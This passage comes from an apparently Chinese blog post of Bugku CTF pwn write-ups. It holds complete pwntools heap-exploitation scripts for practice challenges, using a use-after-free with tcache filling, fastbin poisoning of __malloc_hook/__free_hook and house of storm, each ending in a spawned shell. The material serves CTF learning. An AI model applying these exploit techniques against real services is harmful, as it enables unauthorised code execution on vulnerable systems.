+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'encode:'</span><span class="token punctuation">,</span>choice3encode<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>至于他为什么一个字节一个字节该是因为这两个的地址几乎不一样。所以我感觉很鸡肋。</p>
+<p><img src="https://s2.loli.net/2024/08/21/mnkhaOW2o8JAlxr.png" alt="83a94331d7407a047f0484393068af91.png"></p>
+<h4 id="Baby-heap2"><a href="#Baby-heap2" class="headerlink" title="Baby-heap2"></a>Baby-heap2</h4><p>这题就有意思了，题目给的描述是2.31结果下面都说是2.27。然后我用2.27得到的libc_base才是正确的，但是远程也是打不通的。本地都通了。</p>
+<p>这题和之前哪一题逻辑一样，只不过不是堆溢出了，改成了uaf。把tcache填满，在申请一个0x80的chunk，放到unsortedbin里面就可以泄露出来信息（uaf）。之后就是正常，当时远程打不通，我以为是我的方法问题用了两种方法一个是该free_hook还有一个是用realloc调节栈帧之后oog。本地都通了。以下是我用的libc，也是远程环境的。</p>
+<p><img src="https://s2.loli.net/2024/08/21/t8PMmn4IEq53wKp.png" alt="13c3d7435fd96f2a43a5055770c0fae9.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#用realloc调节栈帧之后oog</span>
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ru<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#heap - 0x4080</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#3-9</span>
+        add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        delete<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
+    leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x70</span>
+    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token comment">#10</span>
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#11</span>
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#12</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+    
+    edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#13</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#14</span>
+    <span class="token comment"># add(0x68)#15</span>
+    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base
+
+    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
+   	pl <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x1b</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"realloc"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"leak"</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"fake_chunk"</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>
+
+    <span class="token comment"># gdb()</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/38DxIWM1GX6sRmf.png" alt="e76264eed7092de47da47eb9361ae351.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#改__free_hook为system</span>
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ru<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token comment">#heap - 0x4080</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#3-9</span>
+        add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        delete<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    ru<span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span>
+    leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    __malloc_hook <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x70</span>
+    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token comment">#10</span>
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#11</span>
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#12</span>
+    
+    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+    
+    edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#13</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#14</span>
+    
+    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>libc_base
+
+    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f29e</span><span class="token punctuation">,</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>
+    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+    edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
+
+    edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'/bin/bash\x00'</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"leak"</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"free_hook"</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
+    
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://s2.loli.net/2024/08/21/PjS1LGHmAu3DqJV.png" alt="736948c0d7c84396d1be5d72195a6809.png"></p>
+<h4 id="simple-storm"><a href="#simple-storm" class="headerlink" title="simple_storm"></a>simple_storm</h4><blockquote>
+<p>其实我想起来打这个靶场，还是在学习house of storm的时候。看到了这个地方有这个题。所以就给它打了。</p>
+</blockquote>
+<p>这题顾名思义，肯定用house of storm来打。</p>
+<ul>
+<li>适合版本是libc2.23-2.29</li>
+<li>需要能修改<em>unsortedbin的bk，</em>largebin的bk,bk_nextsize</li>
+</ul>
+<p>原理网上都是，其实记不记得问题也不大。就只需要知道你需要构造一个unsortedbin和largebin，修改unsortedbin的bk&#x3D;target_addr(目标地址), 修改largebin的bk&#x3D;target_addr + 0x8, bk_nextsize &#x3D; target_addr -0x20+3(0x1d)，之后在申请一个0x50范围的chunk就可以得到目标地址。</p>
+<p>本题直接打free_hook,就可以了。这个成功概率大概50%所以多试几次就好了。</p>
+<p>成功修改__free_hook为system</p>
+<p><img src="https://s2.loli.net/2024/08/21/mPYs8j7w3tN6x4R.png" alt="072ea12359d232de973be0a524ab730a.png"></p>
+<p>最后getshell</p>
+<p><img src="https://s2.loli.net/2024/08/21/OP3Cfnx7ytNgQEi.png" alt="0e161d9deab4acea5f14897cb747e948.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ru<span class="token punctuation">(</span><span class="token string">"Your choice?\n"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+        ru<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+    add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token comment">#3</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#4</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#5</span>
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#6</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    main_arenas <span class="token operator">=</span> uu64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x58</span>
+
+    show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+    heap <span class="token operator">=</span> u68<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#5 = 7 </span>
+    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">)</span><span class="token comment">#3 = 8</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+    malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
+    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
+    fake_chunk <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span>
+
+    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span> 
+    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>                      <span class="token comment">#修改unsortedbin的bk=addr</span>
+
+    <span class="token comment">#pl = p64(0) + p64(fake_chunk+0x8) + p64(0) + p64(fake_chunk - 0x1d)</span>
+    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk <span class="token operator">-</span> <span class="token number">0x20</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>                      <span class="token comment">#修改largebin的bk=addr+0x8,bk_nextsize=addr-0x20+3</span>
+
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment">#建议先edit之后在申请0x50范围的chunk，这个是有概率成功的</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>
+    
+    pl <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span>
+
+    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"fake_chunk"</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"main_arenas"</span><span class="token punctuation">,</span>main_arenas<span class="token punctuation">)</span>
+    lg<span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span>
+    <span class="token comment"># gdb()</span>
+exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>您能看到这里，我真的很开心。就如我的摘录所说，打CTF也是一个兴趣，强制消费才可以阅读wp这多少有点寒了新手的心，我本人学pwn大概快小半年了，个人感觉万事开头难，多经过几次折磨坐牢就会有所提升。我写这篇文章的目的就是为了让新生有个可以参考的地方，当然如果您是个富哥，也可以给我的赞助一点。因为本人想玩黑猴，哈哈哈哈哈哈。</p>
+<p>最后引用孙悟空的一句话送给正在阅读这篇文章的您：</p>
+<p><strong>人生贵在坚持，半途而废者多怨天尤人，不懈努力者总勇攀高峰。</strong></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wx.jpg" alt="da1sy 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/zhifubao.jpg" alt="da1sy 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>da1sy
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://example.com/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/" title="Bugku_CTF的pwn题解">https://example.com/2024/08/21/bugku-ctf的pwn题解/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># PWN</a>
+              <a href="/tags/binary/" rel="tag"># Binary</a>
+          </div>
+
+        
+
+          <div class="post-nav">
